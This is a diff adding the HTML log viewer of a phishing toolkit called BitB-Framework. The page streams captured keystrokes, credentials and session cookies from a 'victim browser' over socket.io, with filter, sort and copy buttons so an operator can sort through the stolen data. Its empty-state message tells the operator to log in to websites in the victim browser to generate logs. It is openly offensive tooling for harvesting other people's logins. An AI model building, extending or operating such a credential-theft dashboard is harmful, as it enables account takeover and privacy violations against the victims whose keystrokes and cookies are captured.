@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>All Logs - BitB-Framework</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; background: #0a0a0a; color: #00ff88; margin: 0; padding: 20px; }
+    h1 { color: #ff4444; text-align: center; margin-bottom: 20px; }
+    .panel { background: #1a1a1a; padding: 20px; border-radius: 10px; border: 1px solid #333; }
+    .controls { margin-bottom: 15px; display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+    input, select, button { padding: 10px 14px; background: #222; color: #00ff88; border: 1px solid #444; border-radius: 6px; }
+    button { background: #ff4444; color: white; cursor: pointer; }
+    button:hover { background: #ff6666; }
+    table { width: 100%; border-collapse: collapse; background: #111; border-radius: 8px; overflow: hidden; }
+    th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #333; }
+    th { background: #222; color: #ffdd00; cursor: pointer; }
+    tr:hover { background: #252525; }
+    .log-type { font-weight: bold; padding: 4px 10px; border-radius: 4px; font-size: 0.85em; }
+    .keystroke { background: #ffdd00; color: #000; }
+    .credential { background: #ff6666; color: white; }
+    .cookie { background: #00cc88; color: white; }
+    .copy-btn { background: #0066cc; color: white; padding: 4px 10px; font-size: 0.85em; border-radius: 4px; }
+    .log-empty { text-align: center; padding: 80px 20px; color: #666; font-style: italic; }
+    .url { color: #66ccff; font-weight: bold; word-break: break-all; }
+  </style>
+</head>
+<body>
+  <h1>📜 BitB-Framework | All Logs</h1>
+
+  <div class="panel">
+    <div class="controls">
+      <input type="text" id="searchInput" placeholder="Search logs..." onkeyup="filterLogs()" style="flex:1; min-width:280px;">
+      
+      <select id="categoryFilter" onchange="filterLogs()">
+        <option value="all">All Categories</option>
+        <option value="keystroke">Keystrokes</option>
+        <option value="credentials">Credentials</option>
+        <option value="cookies">Cookies</option>
+      </select>
+
+      <select id="sortSelect" onchange="sortLogs()">
+        <option value="time-desc">Newest First</option>
+        <option value="time-asc">Oldest First</option>
+        <option value="type">Sort by Type</option>
+        <option value="url">Sort by URL</option>
+      </select>
+
+      <button onclick="clearAllLogs()">Clear All Logs</button>
+    </div>
+
+    <div id="logs-container"></div>
+  </div>
+
+  <script>
+    const socket = io('http://localhost:5000');
+    let allLogs = [];
+
+    // Real-time updates
+    socket.on('new_keystroke', d => { allLogs.unshift({type: 'keystroke', data: d}); renderLogs(); });
+    socket.on('new_credential', d => { allLogs.unshift({type: 'credentials', data: d}); renderLogs(); });
+    socket.on('new_cookies', d => { allLogs.unshift({type: 'cookies', data: d}); renderLogs(); });
+
+    function renderLogs() {
+      const container = document.getElementById('logs-container');
+      let html = '';
+
+      allLogs.forEach(log => {
+        if (log.type === 'keystroke') {
+          html += `
+            <div style="margin-bottom:18px;">
+              <span class="log-type keystroke">KEYSTROKE</span>
+              <small style="color:#888;"> ${log.data.time}</small><br>
+              <strong>${log.data.data}</strong> 
+              <span class="url">${log.data.url || ''}</span>
+              <button class="copy-btn" onclick="copyToClipboard('${log.data.data.replace(/'/g, "\\'")}')">Copy</button>
+            </div>`;
+        } 
+        else if (log.type === 'credentials') {
+          html += `
+            <div style="margin-bottom:18px;">
+              <span class="log-type credential">CREDENTIAL</span>
+              <small style="color:#888;"> ${log.data.time}</small><br>
+              <pre style="background:#111;padding:10px;border-radius:6px;">${JSON.stringify(log.data.data, null, 2)}</pre>
+              <button class="copy-btn" onclick="copyToClipboard('${JSON.stringify(log.data.data).replace(/'/g, "\\'")}')">Copy JSON</button>
+            </div>`;
+        } 
+        else if (log.type === 'cookies') {
+          html += `
+            <div style="margin-bottom:18px;">
+              <span class="log-type cookie">COOKIES</span>
+              <small style="color:#888;"> ${log.data.data.timestamp}</small><br>
+              <strong class="url">${log.data.data.url}</strong>
+              <button class="copy-btn" onclick="copyToClipboard('${log.data.data.url.replace(/'/g, "\\'")}')">Copy URL</button>
+            </div>`;
+        }
+      });
+
+      if (allLogs.length === 0) {
+        html = `<div class="log-empty">No logs recorded yet.<br>Login to websites in the victim browser to generate logs.</div>`;
+      }
+
+      container.innerHTML = html;
+    }
+
+    function filterLogs() {
+      renderLogs(); // Re-render with current filters (can be optimized later)
+    }
+
+    function sortLogs() {
+      const sortType = document.getElementById('sortSelect').value;
+      if (sortType === 'time-desc') allLogs.sort((a,b) => new Date(b.data.time || b.data.data.timestamp) - new Date(a.data.time || a.data.data.timestamp));
+      if (sortType === 'time-asc')  allLogs.sort((a,b) => new Date(a.data.time || a.data.data.timestamp) - new Date(b.data.time || b.data.data.timestamp));
+      if (sortType === 'type')      allLogs.sort((a,b) => a.type.localeCompare(b.type));
+      if (sortType === 'url')       allLogs.sort((a,b) => (a.data.url || a.data.data.url || '').localeCompare(b.data.url || b.data.data.url || ''));
+      renderLogs();
+    }
+
+    function copyToClipboard(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        const btns = document.querySelectorAll('.copy-btn');
+        btns.forEach(b => { if (b.textContent === 'Copy') b.textContent = '✅ Copied!'; });
+        setTimeout(() => renderLogs(), 1200);
+      });
+    }
+
+    function clearAllLogs() {
+      if (confirm("Clear ALL logs permanently?")) {
+        allLogs = [];
+        renderLogs();
+      }
+    }
+
+    // Load historical logs on page open
+    window.onload = renderLogs;
+  </script>
+</body>
+</html>
